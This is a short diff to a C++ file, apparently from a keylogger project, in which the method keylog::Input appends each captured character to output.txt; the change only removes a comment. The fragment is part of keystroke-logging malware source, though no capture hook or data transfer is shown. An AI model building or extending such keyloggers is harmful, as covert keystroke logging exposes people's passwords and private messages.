@@ -2,7 +2,7 @@
 #include <iostream>
 
 void keylog::Input(char m) {
-    std::ofstream Output("output.txt", std::ios::app); // Use append mode to not overwrite existing content
+    std::ofstream Output("output.txt", std::ios::app);
     Output << m;
     Output.close();
 }
